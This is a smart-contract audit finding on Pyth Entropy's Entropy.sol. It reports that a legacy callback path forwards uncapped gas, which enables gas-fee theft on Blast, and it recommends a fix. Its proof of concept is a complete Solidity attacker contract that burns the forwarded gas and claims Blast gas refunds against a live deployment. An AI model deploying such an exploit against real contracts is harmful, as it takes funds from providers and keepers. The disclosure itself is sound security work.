### Title
Unbounded Gas Forwarding to Untrusted Requester Callback in Legacy `revealWithCallback` Path Enables Gas Theft on Blast — (`File: target_chains/ethereum/contracts/contracts/entropy/Entropy.sol`)

---

### Summary

In `Entropy.sol`, `revealWithCallback` contains a legacy code path (triggered when `req.gasLimit10k == 0`) that calls the untrusted requester's `_entropyCallback` with **no gas cap**, forwarding all remaining gas. On Blast — where Pyth Entropy is deployed and where contracts can claim gas fees for code executed in their context — a malicious requester contract can inflate gas usage inside its callback to steal gas fees from the provider/keeper who submits `revealWithCallback`.

---

### Finding Description

`revealWithCallback` in `Entropy.sol` branches on whether `req.gasLimit10k != 0`:

- **New path** (`gasLimit10k != 0`, lines 574–660): uses `excessivelySafeCall` with an explicit gas cap — safe.
- **Legacy path** (`gasLimit10k == 0`, lines 661–702): calls the requester's callback with **no gas limit**:

```solidity
// Entropy.sol L675-L681
if (len != 0) {
    IEntropyConsumer(callAddress)._entropyCallback(
        sequenceNumber,
        provider,
        randomNumber
    );
}
``` [1](#0-0) 

The legacy path is active whenever a provider has `defaultGasLimit == 0` (opted out of the failure-state flow). The test suite explicitly confirms this: when `setDefaultGasLimit(0)` is called, all requests for that provider store `gasLimit10k == 0`, routing them through the uncapped legacy branch. [2](#0-1) 

Pyth Entropy is deployed on Blast at `0x5744Cbf430D99456a0A8771208b674F27f8EF0Fb`. The repository also contains a `blast-gas-claim-patch.diff` that adds `configureClaimableGas()` to Pyth contracts on Blast, confirming that Blast gas-claiming mechanics are in scope and actively used. [3](#0-2) 

On Blast, every contract can claim the gas fees paid by the transaction sender for code executed within its own context. When Entropy calls the requester's `_entropyCallback` with no gas limit, all gas burned inside the requester's contract is claimable by the requester — not by Entropy. The provider/keeper who submitted `revealWithCallback` pays the full gas cost of the transaction, but the malicious requester contract captures those fees via Blast gas claims.

---

### Impact Explanation

A malicious requester contract can:

1. Deploy a contract with a gas-inflating `entropyCallback` (e.g., a tight hash loop consuming all forwarded gas).
2. Call `requestWithCallback` on a provider with `defaultGasLimit == 0`, paying only the small protocol fee.
3. Wait for the provider/keeper to call `revealWithCallback`.
4. The Entropy contract forwards all remaining gas (no cap) to the malicious callback.
5. The malicious callback burns the maximum possible gas.
6. On Blast, the malicious requester contract claims the gas fees for all gas burned in its callback.

The provider/keeper suffers a direct financial loss proportional to the gas burned. The attacker profits from Blast gas refunds at zero marginal cost beyond the initial request fee. This can be repeated across many requests ("gas bomb" pattern), and the attack is amplified by Blast's gas-claiming incentive that does not exist on other chains.

---

### Likelihood Explanation

- Pyth Entropy is live on Blast (`0x5744Cbf430D99456a0A8771208b674F27f8EF0Fb`).
- The legacy path (`gasLimit10k == 0`) is reachable by any unprivileged user who requests entropy from a provider with `defaultGasLimit == 0`.
- `revealWithCallback` is callable by anyone — no privileged role required.
- The attack requires only deploying a malicious consumer contract and paying the standard entropy request fee.
- The `EntropyTester.sol` contract in the repository already demonstrates the gas-inflation pattern (consuming configurable gas in a callback loop), confirming the attack is straightforward to implement. [4](#0-3) 

---

### Recommendation

In the legacy path of `revealWithCallback`, cap the gas forwarded to the requester's callback using the provider's `defaultGasLimit` (or a protocol-defined maximum). If `defaultGasLimit == 0`, either refuse to make the callback or apply a hard-coded safe gas cap. Alternatively, migrate all providers to the new `gasLimit10k != 0` path (which already uses `excessivelySafeCall`) and deprecate the uncapped legacy branch entirely.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@pythnetwork/entropy-sdk-solidity/IEntropyConsumer.sol";
import "@pythnetwork/entropy-sdk-solidity/IEntropy.sol";

// Blast gas-claiming interface
interface IBlast {
    function configureClaimableGas() external;
    function claimAllGas(address contractAddress, address recipient) external returns (uint256);
}

contract MaliciousEntropyRequester is IEntropyConsumer {
    IEntropy public entropy;
    address public provider;
    IBlast constant BLAST = IBlast(0x4300000000000000000000000000000000000002);

    constructor(address _entropy, address _provider) {
        entropy = IEntropy(_entropy);
        provider = _provider;
        // Register for Blast gas claiming
        BLAST.configureClaimableGas();
    }

    function attack() external payable {
        uint256 fee = entropy.getFee(provider);
        // Uses legacy requestWithCallback — provider has defaultGasLimit == 0
        // so gasLimit10k will be 0, routing to the uncapped legacy path
        entropy.requestWithCallback{value: fee}(provider, bytes32(uint(42)));
    }

    // Called by Entropy with NO gas cap (legacy path, gasLimit10k == 0)
    function entropyCallback(
        uint64, address, bytes32 randomNumber
    ) internal override {
        // Burn all forwarded gas — provider/keeper pays, we claim on Blast
        uint256 i = 0;
        while (gasleft() > 5000) {
            keccak256(abi.encodePacked(i++, randomNumber));
        }
    }

    function getEntropy() internal view override returns (address) {
        return address(entropy);
    }

    function claimGas(address recipient) external {
        BLAST.claimAllGas(address(this), recipient);
    }
}
```

**Attack flow:**
1. Deploy `MaliciousEntropyRequester` on Blast, targeting a provider with `defaultGasLimit == 0`.
2. Call `attack()` — pays only the small entropy fee.
3. Provider/keeper calls `revealWithCallback` — Entropy reaches the legacy branch at line 676 and calls `_entropyCallback` with no gas limit.
4. Malicious callback burns all forwarded gas.
5. Call `claimGas()` — Blast pays out gas fees for all gas burned in the malicious contract's context.
6. Provider/keeper's gas cost is stolen. [5](#0-4) [6](#0-5)

### Citations

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L574-576)
```text
        if (
            req.gasLimit10k != 0 &&
            req.callbackStatus == EntropyStatusConstants.CALLBACK_NOT_STARTED
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L661-681)
```text
        } else {
            // This case uses the checks-effects-interactions pattern to avoid reentry attacks
            address callAddress = req.requester;
            EntropyStructs.Request memory reqV1 = EntropyStructConverter
                .toV1Request(req);
            clearRequest(provider, sequenceNumber);
            // WARNING: DO NOT USE req BELOW HERE AS ITS CONTENTS HAS BEEN CLEARED

            // Check if the requester is a contract account.
            uint len;
            assembly {
                len := extcodesize(callAddress)
            }
            uint256 startingGas = gasleft();
            if (len != 0) {
                IEntropyConsumer(callAddress)._entropyCallback(
                    sequenceNumber,
                    provider,
                    randomNumber
                );
            }
```

**File:** target_chains/ethereum/contracts/test/Entropy.t.sol (L1730-1738)
```text
        // A provider with a 0 gas limit is opted-out of the failure state flow, indicated by
        // a 0 gas limit on all requests.
        vm.prank(provider1);
        random.setDefaultGasLimit(0);

        assertGasLimitAndFee(0, 0, 1);
        assertGasLimitAndFee(10000, 0, 1);
        assertGasLimitAndFee(20000, 0, 1);
        assertGasLimitAndFee(100000, 0, 1);
```

**File:** target_chains/ethereum/contracts/chain_patches/blast-gas-claim-patch.diff (L9-24)
```text
+interface IBlast {
+    function configureClaimableGas() external;
+}
+
 abstract contract Pyth is
     PythGetters,
     PythSetters,
@@ -722,4 +726,9 @@ abstract contract Pyth is
     function version() public pure returns (string memory) {
         return "1.4.3";
     }
+
+    function configureClaimableGas() external {
+        IBlast(0x4300000000000000000000000000000000000002)
+            .configureClaimableGas();
+    }
```

**File:** target_chains/ethereum/contracts/contracts/entropy/EntropyTester.sol (L209-221)
```text
        uint256 startGas = gasleft();

        bytes32 key = callbackKey(msg.sender, _provider, _sequence);
        CallbackData memory callback = callbackData[key];
        delete callbackData[key];

        // Keep consuming gas until we reach our target
        uint256 currentGasUsed = startGas - gasleft();
        while (currentGasUsed < callback.gasUsage) {
            // Consume gas with a hash operation
            keccak256(abi.encodePacked(currentGasUsed, _randomness));
            currentGasUsed = startGas - gasleft();
        }
```
